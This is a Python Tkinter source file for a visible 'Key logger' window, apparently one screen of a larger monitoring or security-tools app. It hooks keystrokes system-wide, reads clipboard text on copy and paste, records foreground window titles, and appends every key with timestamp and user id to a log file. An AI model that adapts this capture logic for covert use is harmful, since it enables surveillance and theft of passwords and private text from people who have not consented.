import os
import ssl
import tkinter
from tkinter import *
from tkinter.filedialog import asksaveasfilename
import keyboard
from PIL import Image, ImageTk
import ctypes
from tkinter import messagebox
import win32gui
import win32clipboard
import datetime


class Keylogger_SCREEN(tkinter.Toplevel):
    def __init__(self, parent,user_id):
        super().__init__(parent)
        self.parent = parent
        self.geometry("1920x1080")
        self.canvas = Canvas(self, width=self.winfo_screenwidth(), height=self.winfo_screenheight())
        self.resizable(width=False, height=False)
        self.canvas.pack(fill='both', expand=True)
        self.protocol("WM_DELETE_WINDOW", self.close)
        self.title('Key logger')
        self.wm_iconbitmap('Photos/bug.ico')
        self.user_id = user_id
        self.special_keys = [
        "caps lock", "shift", "enter", "alt", "ctrl", "backspace", "tab",
        "esc", "left windows", "right windows", "left cmd", "right cmd", "menu",
        "print screen", "scroll lock", "pause", "insert", "home", "page up",
        "page down", "end", "delete", "up", "down", "left", "right", "num lock",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12"
    ]
        self.keystrokes = ""
        self.ctrl_pressed = False
        self.clipboard_text = ""
        self.previous_window = None
        self.sentiment = None
        self.create_gui()

    def create_gui(self):
        text_font='Comic Sans MS'

        # Setting background image
        self.bg_image = ImageTk.PhotoImage(Image.open("Photos/background.jpg"))
        self.bg_item = self.canvas.create_image(0, 0, image=self.bg_image, anchor='nw')
        self.canvas.tag_lower(self.bg_item)

        # Adding close button
        self.close_button = Button(self, text='return to Home screen', command=self.close, font=(text_font, 15))
        self.close_button.place(relx=0.5, rely=0.9, anchor='s')

        # Adding "Write something to get started" text
        self.start = self.canvas.create_text(950, 500, text="Write something to get started", font=('david', 40),fill="#00308F")

        # Adding Save, Clear and Stop buttons
        self.save_button = Button(self, text='Save Keystrokes', command=self.save_keystrokes,font=(text_font, 15))
        self.save_button.place(relx=0.5, rely=0.8, anchor='s')

        self.clear_button = Button(self, text='Clear Keystrokes', command=self.clear_keystrokes,font=(text_font, 15))
        self.clear_button.place(relx=0.3, rely=0.8, anchor='s')

        self.stop_button = Button(self, text='Stop Keylogger', command=self.stop_keylogger, font=(text_font, 15))
        self.stop_button.place(relx=0.7, rely=0.8, anchor='s')

        # Setting up keyboard listener for detecting keystrokes
        keyboard.on_press(self.detect_keystrokes)

    @staticmethod
    def send_message(client_socket, message):
        message = message.encode('utf-8')
        message_length = len(message)
        send_length = message_length.to_bytes(4, 'big')
        try:
            client_socket.send(send_length)
            client_socket.send(message)
        except ssl.SSLError as e:
            print(f"SSL error occurred: {e}")
        except Exception as e:
            print(f"An error occurred: {e}")


    def log_keystrokes(self, key, active_window_title):
        user = self.user_id
        now = datetime.datetime.now()
        log_data = f'{now} | {key} | Window:{active_window_title}|{user}'
        with open('../Logs/keystrokes.log', 'a', encoding='utf-8') as f:
            f.write(log_data + '\n')

    def detect_keystrokes(self, event):
        try:
            if event.event_type == "down":
                if event.name == "ctrl":
                    self.ctrl_pressed = True
                elif event.name == "c" and self.ctrl_pressed:
                    self.clipboard_text = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                    return
                elif event.name == "v" and self.ctrl_pressed:
                    win32clipboard.OpenClipboard()
                    clipboard_text = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                    win32clipboard.CloseClipboard()
                    self.keystrokes += clipboard_text

            elif event.event_type == "up":
                if event.name == "ctrl":
                    self.ctrl_pressed = False
        except Exception as e:
            print(f"Error while monitoring clipboard: {e}".encode("utf-8"))

        active_window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if active_window_title != self.previous_window:
            self.keystrokes += ' ({})\n'.format(active_window_title)
            self.previous_window = active_window_title

        if event.name == "space":
            self.keystrokes = self.keystrokes + " "
            self.log_keystrokes(" ", active_window_title)
        elif event.name in self.special_keys:
            return
        else:
            self.keystrokes = self.keystrokes + event.name
            self.log_keystrokes(event.name, active_window_title)

        if len(self.keystrokes) % 75 == 0:
            self.keystrokes += '\n'

        self.display_keystrokes(active_window_title, self.keystrokes)
        active_window_title = ctypes.create_unicode_buffer(100)
        ctypes.windll.user32.GetWindowTextW(ctypes.windll.user32.GetForegroundWindow(), active_window_title, 100)
        self.display_keystrokes(active_window_title.value, self.keystrokes)

        self.canvas.delete(self.start)
        self.update()

    def display_keystrokes(self, active_window_title, keystrokes):
        text_font='Comic Sans MS'
        if not hasattr(self, 'active_window_label'):
            self.active_window_label = Label(self, font=(text_font, 30), bg='#ADD8E6', relief='solid')
            self.active_window_label.pack(pady=10)
            self.active_window_label.place(relx=0.5, rely=0.2, anchor='center')

        if not hasattr(self, 'keystroke_label'):
            self.keystroke_label = Label(self, font=(text_font, 20), bg='#ADD8E6', relief='solid')
            self.keystroke_label.pack(pady=10)
            self.keystroke_label.place(relx=0.5, rely=0.5, anchor='center')

        if self.active_window_label.winfo_exists():
            self.active_window_label.config(text="Active Window: " + active_window_title)
        if hasattr(self, 'keystroke_label'):
            self.keystroke_label.config(text="Keystrokes: " + keystrokes)
        else:
            self.keystroke_label = Label(self, text="Keystrokes: " + keystrokes, font=(text_font, 15))
            self.keystroke_label.place(relx=0.5, rely=0.6, anchor='s')



    def clear_keystrokes(self):
        self.keystrokes = ""
        self.display_keystrokes("", self.keystrokes)


    def stop_keylogger(self):
        if self.stop_button['text'] == "Stop Keylogger":
            keyboard.unhook_all()
            self.stop_button.config(text="Continue Keylogger")
        else:
            keyboard.on_press(self.detect_keystrokes)
            self.stop_button.config(text="Stop Keylogger")

    def save_keystrokes(self):
        keyboard.unhook_all()
        filename = asksaveasfilename(defaultextension='.txt', filetypes=[('Text Files', '*.txt')])
        if not filename:
            keyboard.hook(self.detect_keystrokes)
            return
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(self.keystrokes)
        self.show_message("Keystrokes saved to " + os.path.basename(filename))
        keyboard.hook(self.detect_keystrokes)

    @staticmethod
    def show_message(message):
        messagebox.showinfo("Message", message)

    def close(self):
        self.stop_keylogger()
        try:
            self.parent.deiconify()
            self.destroy()
        except AttributeError:
            pass
